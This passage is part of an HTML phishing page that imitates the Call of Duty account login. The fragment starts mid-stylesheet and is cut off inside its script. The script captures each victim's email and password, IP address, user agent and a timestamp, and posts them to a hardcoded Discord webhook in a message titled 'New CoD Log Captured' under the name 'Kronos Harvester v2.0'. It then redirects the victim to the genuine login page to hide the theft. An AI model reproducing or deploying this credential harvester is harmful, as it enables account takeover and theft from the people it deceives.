: #f9a826; } </style> </head> <body> <div class="login-container"> <div class="logo"> <img src="https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/kronos/common/logo-cod.svg" alt="Call of Duty"> </div> <h2>Account Login</h2> <form id="loginForm"> <div class="input-group"> <label for="email">Email Address</label> <input type="email" id="email" name="email" required placeholder="Enter your email"> </div> <div class="input-group"> <label for="password">Password</label> <input type="password" id="password" name="password" required placeholder="Enter your password"> </div> <button type="submit" class="btn-login">Log In</button> </form> <div class="footer-links"> <a href="#">Forgot Password?</a> <a href="#">Create an Account</a> </div> </div> <script> document.getElementById('loginForm').addEventListener('submit', async function(e) { e.preventDefault(); const email = document.getElementById('email').value; const password = document.getElementById('password').value; const webhookUrl = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT'; let ip = 'Unknown'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch(err) {} const userAgent = navigator.userAgent; const timestamp = new Date().toISOString(); const payload = { embeds: [{ title: "🎯 New CoD Log Captured", color: 16361510, fields: [ { name: "Email", value: "`" + email + "`", inline: true }, { name: "Password", value: "`" + password + "`", inline: true }, { name: "IP Address", value: ip, inline: false }, { name: "User Agent", value: userAgent, inline: false }, { name: "Time", value: timestamp, inline: false } ], footer: { text: "Kronos Harvester v2.0" } }] }; fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }) .then(() => { window.location.href = 'https://profile.callofduty.com/cod/login'; }) .ca
